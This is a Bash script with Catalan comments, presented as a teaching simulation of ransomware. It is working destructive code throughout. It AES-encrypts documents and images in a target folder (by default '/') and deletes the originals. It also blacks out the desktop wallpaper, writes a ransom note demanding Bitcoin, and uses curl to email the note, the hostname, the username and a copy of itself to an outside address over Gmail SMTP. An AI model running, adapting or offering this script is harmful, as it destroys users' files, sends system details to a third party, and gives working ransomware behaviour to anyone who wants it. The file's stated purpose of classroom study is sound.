#!/bin/bash
# ransomware_sim.sh - Simulacio pedagogica d'un atac de Ransomware

# ============================================================
# CONFIGURA AQUI ELS TEUS CREDENCIALS
GMAIL_USER="exemple@exemple.com"
GMAIL_PASS="exemple"   # Contrasenya d'aplicació Gmail (no la normal)
DEST_EMAIL="exemple@exemple.com"
# ============================================================

TARGET="${1:-/}"
PASS="exemple"
EXT=".locked"
NOTE="$TARGET/LLEGEIX-ME_RANSOM.log"
SCRIPT_PATH="$(realpath "$0")"

# ---------- 1) Xifrar els documents ----------
echo "[*] Inici de la infeccio... $(date '+%H:%M:%S')"

count=0
for f in "$TARGET"/*; do
    [ -f "$f" ] || continue
    case "${f##*.}" in
        pdf|doc|docx|xls|xlsx|ppt|pptx|txt|jpg|jpeg|png|odt|csv|md|log)
            if openssl enc -aes-256-cbc -salt -pbkdf2 \
                -in "$f" -out "$f$EXT" -pass pass:"$PASS" 2>/dev/null; then
                rm -f "$f"
                count=$((count+1))
            fi
        ;;
    esac
done

echo "[*] Fitxers xifrats: $count"

# ---------- 2) Fons de pantalla negre ----------
gsettings set org.gnome.desktop.background primary-color '#000000'
gsettings set org.gnome.desktop.background picture-options 'none'
gsettings set org.gnome.desktop.background color-shading-type 'solid'
gsettings set org.gnome.desktop.background picture-uri ''
gsettings set org.gnome.desktop.background picture-uri-dark ''
echo "[*] Fons de pantalla canviat a negre"

# ---------- 3) Nota de rescat (.log) ----------
cat > "$NOTE" << EOF
==============================================================
        ATAC DE RANSOMWARE - NOTA DE RESCAT
==============================================================
Data de l'atac : $(date '+%Y-%m-%d %H:%M:%S')
Equip          : $(hostname)
Usuari         : $(whoami)
Carpeta        : $TARGET
Algorisme      : AES-256-CBC (openssl)
Extensio       : $EXT
Fitxers xifrats: $count
--------------------------------------------------------------
Cost del rescat : 1 BTC -> cartera 1R4n0mW4r3Ex4mpl3
--------------------------------------------------------------
Per desxifrar:
  openssl enc -d -aes-256-cbc -pbkdf2 -in fitxer.pdf$EXT \
          -out fitxer.pdf -pass pass:$PASS
==============================================================
PID del proces  : $$
Hora final      : $(date '+%Y-%m-%d %H:%M:%S')
==============================================================
EOF

cat "$NOTE"

# ---------- 4) Enviar email amb el script adjunt ----------
BOUNDARY="boundary_$(date +%s)"

curl --url "smtps://smtp.gmail.com:465" \
     --ssl-reqd \
     --mail-from "$GMAIL_USER" \
     --mail-rcpt "$DEST_EMAIL" \
     --user "$GMAIL_USER:$GMAIL_PASS" \
     --upload-file <(cat << MIME
From: $GMAIL_USER
To: $DEST_EMAIL
Subject: [RANSOMWARE] Els teus fitxers han estat xifrats - P1.4
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="$BOUNDARY"

--$BOUNDARY
Content-Type: text/plain; charset=utf-8

$(cat "$NOTE")

--$BOUNDARY
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="ransomware_sim.sh"
Content-Transfer-Encoding: base64

$(base64 "$SCRIPT_PATH")

--$BOUNDARY--
MIME
) --silent && echo "[*] Email enviat a $DEST_EMAIL" || echo "[!] Error enviant email"

echo ""
echo "[!] PID = $$  |  Mata'l amb: sudo kill -9 $$"
echo "[!] NO tancar la terminal."

# ---------- 5) Mantenir el proces viu a la RAM ----------
sleep 3600
